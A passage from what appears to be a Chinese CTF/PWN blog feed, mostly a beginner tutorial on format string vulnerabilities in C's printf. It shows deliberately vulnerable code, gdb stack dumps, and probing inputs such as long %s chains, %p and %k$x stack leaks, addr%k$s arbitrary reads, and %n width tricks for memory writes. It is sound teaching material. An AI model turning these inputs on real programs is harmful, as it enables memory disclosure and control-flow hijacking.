value 传递 <span class="type">int</span> 类型的值，也可以传递 <span class="type">char</span> 类型的值，<span class="type">int</span> 和 <span class="type">char</span> 可以根据 ASCII 码相互转换。</span><br><span class="line">num:为 ptr 的前 num 个字节</span><br><span class="line"><span class="type">size_t</span>:就是<span class="type">unsigned</span> <span class="type">int</span>。</span><br></pre></td></tr></table></figure><h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br><span class="line"></span><br><span class="line">ptr – 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针</span><br><span class="line">size – 这是要读取的每个元素的大小，以字节为单位</span><br><span class="line">nmemb – 这是元素的个数，每个元素的大小为 size 字节</span><br><span class="line">stream – 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输入流</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN入门-格式化字符串</title>
      <link href="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考<a href="https://blog.csdn.net/weixin_34128411/article/details/87980752">漏洞挖掘基础之格式化字符串-CSDN博客</a></p><h2 id="格式化字符串函数介绍"><a href="#格式化字符串函数介绍" class="headerlink" title="格式化字符串函数介绍"></a>格式化字符串函数介绍</h2><p>格式化字符串函数将第一个参数作为格式化字符串，根据其来解析之后的参数。一般来说格式化字符串在利用的时候主要分三个部分</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数<h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3>输入函数：<code>scanf</code><br>输出函数：<img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250209201042.png" alt="Pasted image 20250209201042"></li></ul></blockquote><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>基本格式如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%[parameter] [flag] [field width] [.precision] [length] type</span><br></pre></td></tr></table></figure><br>中括号中的属性是可选的，不需要一定都写上，比如%08x，他就只用到了其中的一部分。下面举几个比较重要的属性讲一下：<br><code>parameter</code></p><ul><li>n$，获取格式化字符串中的指定参数<br><code>flag</code><br><code>field width</code>，输出的最小宽度<br><code>precision</code>，输出的最大长度<br><code>length</code>，输出的长度</li><li>hh，输出一个字节</li><li>h，输出一个双字节<br><code>type</code></li><li>d/i，有符号整数</li><li>u，无符号整数</li><li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li><li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li><li>p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li><li>n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</li><li>%， ‘%’字面值，不接受任何 flags, width。<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3>要输出的变量</li></ul><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>格式化串漏洞和普通的栈溢出有相似之处，都是利用程序员的疏忽大意来改变程序运行的正常流程。<br>首先，什么是格式化字符串，print()、fprint()等<code>*print()</code>系列的函数可以按照一定的格式将数据进行输出，举个最简单的例子：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;My Name is:  %s&quot;</span> , <span class="string">&quot;Zechariah&quot;</span>)</span><br></pre></td></tr></table></figure><br>执行该函数后将返回字符串：My Name is：Zechariah<br>该printf函数的第一个参数就是格式化字符串，它来告诉程序将数据以什么格式输出。<br>printf()函数的一般形式为：<code>printf(&quot;format&quot;, 输出表列)</code>，我们对format比较关心，看一下它的结构吧：<code>%[标志][输出最小宽度][.精度][长度]类型</code>,其中跟格式化字符串漏洞有关系的主要有以下几点：<br>1、输出最小宽度：用十进制整数来表示输出的最少位数。若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。<br>2、类型：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%c：输出字符，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%d：输出十进制整数，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$1x表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</span><br><span class="line"></span><br><span class="line">%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</span><br><span class="line"></span><br><span class="line">%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n表示将ex64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为八字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整</span><br><span class="line"></span><br><span class="line">%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</span><br></pre></td></tr></table></figure></p><p>关于printf()函数的使用，正常我们使用printf()函数应该是这样的：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br></pre></td></tr></table></figure><p>这是正确的使用方式，但是也有的人会这么用：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line"><span class="built_in">printf</span>(str)</span><br></pre></td></tr></table></figure><br>我们可以对比一下这两段代码，很明显，第二个程序中的printf()函数参数我们是可控的，<strong>我们在控制了format参数之后结合printf()函数的特性就可以进行相应的攻击。</strong></p><h2 id="函数特性"><a href="#函数特性" class="headerlink" title="函数特性"></a>函数特性</h2><h4 id="特性一：-printf-函数的参数个数不固定"><a href="#特性一：-printf-函数的参数个数不固定" class="headerlink" title="特性一： printf()函数的参数个数不固定"></a>特性一： printf()函数的参数个数不固定</h4><p>我们可以利用这一特性进行越界数据的访问。我们先看一个正常的程序：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>;</span><br><span class="line"><span class="type">char</span> buf[]=<span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d\n&quot;</span>,buf,a,b,c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们编译之后运行：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ gcc -fno-<span class="built_in">stack</span>-protector -o format format.c</span><br><span class="line">[email protected]:~/Desktop/format$ ./format </span><br><span class="line">test <span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>接下来我们做一下测试，我们增加一个printf()的format参数，改为：<br><code>printf(&quot;%s %d %d %d %x\n&quot;,buf,a,b，c)</code>，编译后运行：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ gcc -z execstack -fno-<span class="built_in">stack</span>-protector -o format1 format.c</span><br><span class="line">format.c: In function ‘main’:</span><br><span class="line">format.c:<span class="number">6</span>:<span class="number">1</span>: warning: format ‘%x’ expects a matching ‘<span class="type">unsigned</span> <span class="type">int</span>’ argument [-Wformat=]</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d %x\n&quot;</span>,buf,a,b,c);</span><br><span class="line"> ^</span><br><span class="line">[email protected]:~/Desktop/format$ ./format1</span><br><span class="line">test <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> c30000</span><br></pre></td></tr></table></figure><br>虽然gcc在编译的时候提示了一个warning，但还是编译通过了，我们运行后发现多输出了一个C30000，这是个什么数据呢，我们用gdb调试一下看看吧，我们在printf()函数处下个断点，然后运行程序，程序停在了<code>printf()</code>函数入口处<code>0xb7e652f0 __printf+0 push %ebx</code>。<br>我们查看一下此时的栈布局：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; x/<span class="number">10</span>x $sp</span><br><span class="line"><span class="number">0xbffff00c</span>: <span class="number">0x08048466</span>  <span class="number">0x08048510</span>  <span class="number">0xbffff03f</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff01c</span>: <span class="number">0x00000002</span>  <span class="number">0x00000003</span>  <span class="number">0x00c30000</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff02c</span>: <span class="number">0x080482bd</span>  <span class="number">0xbffff2c4</span></span><br><span class="line"></span><br><span class="line"> &gt;&gt;&gt; x/<span class="number">20</span>x $sp</span><br><span class="line"><span class="number">0xbffff00c</span>: <span class="number">0x08048466</span>  <span class="number">0x08048510</span>  <span class="number">0xbffff03f</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff01c</span>: <span class="number">0x00000002</span>  <span class="number">0x00000003</span>  <span class="number">0x00c30000</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff02c</span>: <span class="number">0x080482bd</span>  <span class="number">0xbffff2c4</span>  <span class="number">0x0000002f</span>  <span class="number">0x0804a000</span></span><br><span class="line"><span class="number">0xbffff03c</span>: <span class="number">0x740484d2</span>  <span class="number">0x00747365</span>  <span class="number">0x00000003</span>  <span class="number">0x00000002</span></span><br><span class="line"><span class="number">0xbffff04c</span>: <span class="number">0x00000001</span>  <span class="number">0xb7fc13c4</span>  <span class="number">0xbffff070</span>  <span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250209183436.png" alt="Pasted image 20250209183436"><br>只要我们能够控制format的，我们就可以一直读取内存数据。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d %x %x %x %x %x %x %x %x\n&quot;</span>,buf,a,b,c)</span><br><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">test <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> c30000 <span class="number">1</span> <span class="number">80482b</span>d bf8bf301 <span class="number">2f</span> <span class="number">804</span>a000 <span class="number">740484</span>d2 <span class="number">747365</span></span><br></pre></td></tr></table></figure><p>上一个例子只是告诉我们可以利用%x一直读取栈内的内存数据，可是这并不能满足我们的需求不是，我们要的是<code>任意地址读取</code>,当然，这也是可以的，我们通过下面的例子进行分析：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    fgets(str,<span class="number">200</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以直接尝试去读取str[]的内容呢<br>gdb调试，单步运行完<code>call 0x8048340 &lt;[email protected]&gt;</code>后输入：<br><code>AAAA%08x%08x%08x%08x%08x%08x</code><br>然后我们执行到printf()函数，观察此时的栈区，特别注意一下0x41414141（这是我们str的开始）：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; x/<span class="number">10</span>x $sp</span><br><span class="line"><span class="number">0xbfffef70</span>: <span class="number">0xbfffef88</span>  <span class="number">0x000000c8</span>  <span class="number">0xb7fc1c20</span>  <span class="number">0xb7e25438</span></span><br><span class="line"><span class="number">0xbfffef80</span>: <span class="number">0x08048210</span>  <span class="number">0x00000001</span>  <span class="number">0x41414141</span>  <span class="number">0x78383025</span></span><br><span class="line"><span class="number">0xbfffef90</span>: <span class="number">0x78383025</span>  <span class="number">0x78383025</span></span><br></pre></td></tr></table></figure><br>这时候我们需要借助printf()函数的另一个重要的格式化字符参数%s，我们可以用%s来获取指针指向的内存数据。<br>那么我们就可以这么构造尝试去获取0x41414141地址上的数据：<br><code>\x41\x41\x41\x41%08x%08x%08x%08x%08x%s</code><br>到现在，我们可以利用格式化字符串漏洞读取内存的内容，看起来好像也没什么用啊，就是读个数据而已，我们能不能利用这个漏洞修改内存信息（比如说修改返回地址）从而劫持程序执行流程?</p><h4 id="特性二：利用-n格式符写入数据"><a href="#特性二：利用-n格式符写入数据" class="headerlink" title="特性二：利用%n格式符写入数据"></a>特性二：利用%n格式符写入数据</h4><p>%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，看下面的代码：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num=<span class="number">66666666</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以发现我们用%n成功修改了num的值：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">Before: num = <span class="number">66666666</span></span><br><span class="line"><span class="number">66666666</span></span><br><span class="line">After: num = <span class="number">8</span></span><br></pre></td></tr></table></figure><br>现在我们已经知道可以用构造的格式化字符串去访问栈内的数据，并且<strong>可以利用%n向内存中写入值</strong>，那我们是不是可以修改某一个函数的返回地址从而控制程序执行流程呢，到了这一步细心的同学可能已经发现了，%n的作用只是将前面打印的字符串长度写入到内存中，而我们想要写入的是一个地址，而且这个地址是很大的。这时候我们就需要用到printf()函数的第三个特性来配合完成地址的写入。</p><h4 id="特性三：自定义打印字符串宽度"><a href="#特性三：自定义打印字符串宽度" class="headerlink" title="特性三：自定义打印字符串宽度"></a>特性三：自定义打印字符串宽度</h4><p>我们在上面的基础部分已经有提到关于打印字符串宽度的问题，<strong>在格式符中间加上一个十进制整数来表示输出的最少位数，若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0</strong>。我们把上一段代码做一下修改并看一下效果：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num=<span class="number">66666666</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%.100d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到我们的num值被改为了100<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">Before: num = <span class="number">66666666</span></span><br><span class="line"><span class="number">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="number">66666666</span></span><br><span class="line">After: num = <span class="number">100</span></span><br></pre></td></tr></table></figure><br>如何去覆盖一个地址？，例如把0x8048000这个地址写入内存，我们要做的就是把该<strong>地址对应的10进制134512640</strong>作为格式符控制宽度即可：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.134512640d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;After: num = %x\n&quot;</span>, num);</span><br></pre></td></tr></table></figure><br>可以看到，我们的num被成功修改为8048000<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">Before: num = <span class="number">66666666</span></span><br><span class="line">中间的<span class="number">0</span>省略...........</span><br><span class="line"><span class="number">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666</span></span><br><span class="line">After: num = <span class="number">8048000</span></span><br><span class="line">[email protected]:~/Desktop/format$ </span><br></pre></td></tr></table></figure></p><h3 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h3><p>格式化字符串函数是根据格式化字符串来进行解析的，那么响应的要被解析的参数的个数也是由这个格式化字符串所控制。<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210182528.png" alt="Pasted image 20250210182528"><br>正常的printf函数的结构是格式化字符串与参数一一对应的。那么在调用printf函数的时候参数从右向左进栈，进栈之后格式化字符串是在栈顶的位置。那么在进入printf之后，函数首先获取第一个参数，也就是此时栈顶的格式化字符串，一个一个读取其字符串会遇到两种情况</p><ul><li>当前字符串不是%，直接输出到相应标准输出，比如直接输出一个’hello word‘</li><li>当字符是%，继续读取下一个字符<ul><li>如果没哟字符，报错</li><li>如果下一个字符是%，输出%</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>如果缺少参数呢，例如下面这样：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);</span><br></pre></td></tr></table></figure></p><p>此时可以发现并没有提供参数，那么程序如何运行呢？程序会照样运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为：</p><ul><li>解析其地址对应的字符串</li><li>解析其内容对应的整形值</li><li>解析其内容对应的浮点值<br>  对于第一种情况来说，如果提供了一个不可访问地址，比如0，那么程序就会崩溃，所以说即使printf函数没有给出参数，也会按照格式化字符串给出的格式打印出接下来三处地址中的内容<br>  %d ：十进制，输出十进制整数<br>  %s ： 字符串，从内存中读取字符串<br>  %x ： 十六进制，输出十六进制数<br>  %c ： 字符串，输出字符串<br>  %n ： 到目前为止缩写的字符串数<h2 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h2><h3 id="1-程序崩溃"><a href="#1-程序崩溃" class="headerlink" title="1. 程序崩溃"></a>1. 程序崩溃</h3>拿到一个程序之后可以通过输入若干个%s来进行判断是否存在格式化字符串漏洞<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%s%s%s%s%s%s%s%s%s%s%s%s%s%s</span><br></pre></td></tr></table></figure>前面讲过没有参数的时候printf函数依然还可以输出格式化字符串对应的地址中的内容，<strong>所以如果存在格式化字符串漏洞，在输入一长串%s之后，printf会将%s作为格式化字符串，将对应地址中的内容以字符串的形式输出出来</strong>。<em>但是栈上不可能每个值都对应了合法地址，所以数字对应的内容可能不存在，这个时候就会使程序崩溃</em>。</li></ul><p><strong><em>在Linux中，存取无效的指针会引起进程受到SIGSEGV信号，从而使程序非正常终止并产生核心转储</em></strong></p><h3 id="2-泄露栈内存"><a href="#2-泄露栈内存" class="headerlink" title="2. 泄露栈内存"></a>2. 泄露栈内存</h3><p>例题如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">#编译如下：gcc -m32 -fno-<span class="built_in">stack</span>-protector -no-pie -o leakmemory leakmemory.c</span><br></pre></td></tr></table></figure></p><h4 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h4><p>通过gdb打开程序，在printf处下断点<br>然后按r运行，输入%08x.%08x.%08x<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183257.png" alt="Pasted image 20250210183257"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183302.png" alt="Pasted image 20250210183302"><br>可以看到格式化字符串的第一个%08x解析的是0x1，第二个%08x解析的是0x22222222，第三个%08x解析的是-1，第四个%s解析的是我们输入的“%08x.%08x.%08x”字符串。所以接下来输入c让程序继续执行，我们预计的情况是会将这四处输出出来：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="number">00000001.22222222</span>.ffffffff.%<span class="number">08</span>x.%<span class="number">08</span>x.%<span class="number">08</span>x</span><br></pre></td></tr></table></figure><p>和我们想象的一样，并且程序会继续停在第二个printf函数处，依然还是看一下栈空间<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183522.png" alt="Pasted image 20250210183522"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183657.png" alt="Pasted image 20250210183657"><br>可以看到由于第二次printf没有给参数，所以触发了格式化字符串漏洞，可以看到格式化字符串的第一个%08x解析的是0xffffd090，第二个%08x解析的是0xf7fd0410，第三个%08x解析的是0x1。接下来输入c让程序继续执行，我们预计的效果是打印出“ffffd090. f7fd0410. 00000001”</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ffffd090.f7fd0410<span class="number">.00000001</span>[Inferior <span class="number">1</span> (process <span class="number">2788</span>) exited normally]</span><br></pre></td></tr></table></figure><p>我们不只可以用%x%x%x，还可以使用%p来获取数据：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hollk@ubuntu:~/ctf-challenges/pwn/fmtstr/leakmemory$ ./leakmemory </span><br><span class="line">%p.%p.%p</span><br><span class="line"><span class="number">00000001.22222222</span>.ffffffff.%p.%p.%p</span><br><span class="line"><span class="number">0xffe9c200</span><span class="number">.0</span>xf7eee410<span class="number">.0</span>x1</span><br></pre></td></tr></table></figure><br><strong>由于栈上的数据会因为每次分配的内存页不同，所以并不是每次得到的结果都一样</strong>。我们上面使用的方法一直都是依次输出栈中的每个参数，那么我们想要输出一个特定位置的内容，就需要更改一下输入的内容<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%n$x</span><br></pre></td></tr></table></figure><br>还是通过gdb打开程序，在printf函数下断点，接下来输入r运行起来。这个时候我们按照上面的公式输入%3$x<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/hollk/ctf-challenges/pwn/fmtstr/leakmemory/leakmemory </span><br><span class="line">%<span class="number">3</span>$x</span><br></pre></td></tr></table></figure><br>依旧输入c会打印出“<code>00000001.22222222.ffffffff.%3$x</code>”，并且程序还会停在第二个printf函数处，这个时候我们就需要看一下栈空间了<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183920.png" alt="Pasted image 20250210183920"><br>可以看到我们输入的<code>%3$x</code>被放置到了printf函数格式化字符串的位置，一会我们再讲为什么要输入 <code>%3$x</code>。接下来输入c看一看打印的结果<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211150946.png" alt="Pasted image 20250211150946"><br>可以看到我们输出的是1，也就是上面的0x1，所以说<code>%3$x</code>解析的是0x1。那么就需要仔细琢磨一下我们输入的<code>%3$x</code><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151008.png" alt="Pasted image 20250211151008"><br><strong>事实上我们通过<code>%3$x</code>输出的0x1是格式化字符串的第三个参数，所以我们的%3$x就是第三个参数的意思</strong><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250211151023.png" alt="Pasted image 20250211151023"><br><strong>但是我们实际上输出的是printf的第四个参数，因为格式化字符串就是printf函数的其中一个参数。这样我们就可以不用遍历整个栈，能够指定输出某个栈上的内容</strong></p><h4 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h4><p>其实就是把前面格式化字符串的x改成s就可以了，%s会以字符串的形式输出栈地址中的内容，验证过程和上面一样，就不写了<br><strong>小技巧总结</strong></p><blockquote><p>利用 %x 来获取对应栈的内存，<strong>但建议使用 %p，可以不用考虑位数的区别</strong>。<br>利用 %s 来获取变量所对应地址的内容，只不过<strong>有零截断</strong>。<br>利用 <code>%order$x</code> 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</p><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>有时候我们想要泄露某个libc函数的got表内容，从而的到其地址，进而获取libc版本以及其他函数的地址，这时候能够完全控制泄露某个指定地址的内存就很重要了。<strong>一般来说在格式化字符漏洞中，我们读取的格式化字符串都在栈上。也就是说在调用输出函数的时候，其实第一个参数的值其实就是该格式化字符串的地址</strong><br>由于我们可以控制格式化字符串，如果我们知道格式化字符串在输出函数调用时是第几个参数，这里假设改格式化字符串相对函数调用为第K个参数。那么就可以通过如下 的方式来获取某个指定地址addr的内容<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">addr%k$s</span><br></pre></td></tr></table></figure><br>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[ tag 